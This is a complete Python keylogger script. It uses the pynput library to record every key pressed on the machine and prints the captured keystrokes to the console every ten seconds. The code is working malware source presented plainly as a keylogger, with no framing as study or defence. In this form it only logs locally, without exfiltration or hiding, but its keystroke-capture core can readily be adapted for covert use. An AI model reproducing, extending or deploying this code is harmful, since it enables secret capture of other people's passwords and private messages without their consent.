#!/usr/bin/env python3
import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = "Keylogger started."

    # function to add keys 2 the current ones
    def _append_to_log(self, string):
        self.log = self.log + string

    # process the pressed key
    def _process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self._append_to_log(current_key)

    # function to print the user input in the given interval
    def _report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self._report)
        timer.start()

    def start(self):
        # listening the user input
        keyboard_listener = pynput.keyboard.Listener(on_press=self._process_key_press)
        with keyboard_listener:
            # starts printing keys on the screen
            self._report()
            # waiting the listener to finish
            keyboard_listener.join()


# adding a print interval of 10 seconds
keylogger = Keylogger(10)
# starting the keyloggger
keylogger.start()
